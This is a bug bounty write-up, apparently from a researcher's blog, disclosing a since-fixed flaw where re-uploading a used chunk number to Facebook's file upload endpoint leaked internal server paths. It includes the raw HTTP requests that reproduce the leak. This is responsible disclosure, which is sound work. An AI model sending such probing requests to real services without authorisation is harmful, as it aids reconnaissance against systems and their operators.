---
id: 158
title: 'Internal paths disclosure due to improper exception handling'
date: '2019-02-07T20:30:24+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=158'
categories:
    - Uncategorized
---

This bug could allowed a malicious user to expose internal paths of Facebook main server. The leaked paths were not previously known to the public.   
  
**Demonstration**  
  
The bug occurs in an upload functionality which enable Facebook users to upload big files as chunks. With each upload of a file part, the user has to specify the part/chunk number to upload along with the session_id of the file to upload. While testing i noticed that if we try to upload data after specifying an already used chunk id , an exception is raised and returned in the response along with directories to blame.

To demonstrate this, first we start an upload session for the desired file:

```
POST /intl/request/upload/start/
Host: www.facebook.com


file_type=text&file_size=555&file_name=ex.txt&__a=1&fb_dtsg=XXXXXXX
```

The response should contain a “session_id”, we’ll note it XXXXXXXXXXX  
Then we use the session_id to make a second request :

```
<p>POST /intl/request/upload/chunk/?__a=1&fb_dtsg=YYYYYYYYYYYYYY<br></br>Host: www.facebook.com<br></br>------WebKitFormBoundaryoG5U8hFBDDDDwLwN<br></br> Content-Disposition: form-data; name="chunk_number"<br></br><br></br>1<br></br> ------WebKitFormBoundaryoG5U8hFBDDDDwLwN<br></br> Content-Disposition: form-data; name="session_id"<br></br><br></br>XXXXXXXXXXX<br></br> ------WebKitFormBoundaryoG5U8hFBDDDDwLwN<br></br> Content-Disposition: form-data; name="file_chunk"; filename="XXXXXXXXXXX-1"<br></br> Content-Type: text/html<br></br><br></br><br></br>SOME DATA<br></br> ------WebKitFormBoundaryoG5U8hFBDDDDwLwN--</p>
```

This request should be made twice which will raise the exception and leak the internal paths.

**Timeline**  
Dec 17, 2018 — Report Sent  
Dec 20, 2018—Acknowledged by Facebook  
Jan 9, 2019— Fixed by Facebook  
Jan 22 2019 — Bounty Awarded by Facebook